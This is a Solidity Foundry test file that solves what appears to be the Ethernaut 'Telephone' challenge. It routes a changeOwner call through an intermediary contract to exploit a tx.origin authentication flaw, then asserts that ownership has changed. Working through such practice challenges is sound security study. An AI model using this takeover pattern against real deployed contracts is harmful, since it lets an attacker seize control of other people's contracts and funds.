// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Telephone} from "../instances/Ilevel04.sol";

contract Attacker is Test {
    Telephone cf = new Telephone();
    MiddleContract middle = new MiddleContract();

    function test() external {
        vm.startBroadcast();
        console.log(
            "tx.origin: %s, msg.sender: %s, address of this: %s",
            tx.origin,
            msg.sender,
            address(this)
        );
        address oldOwner = cf.owner();
        console.log("old owner: ", oldOwner);
        middle.changeOwner(address(cf), msg.sender);
        address newOwner = cf.owner();
        console.log("new owner: ", newOwner);
        require(newOwner == msg.sender, "wrong new owner");
        vm.stopBroadcast();
    }
}

contract MiddleContract {
    function changeOwner(address cf, address owner) external {
        Telephone(cf).changeOwner(owner);
    }
}
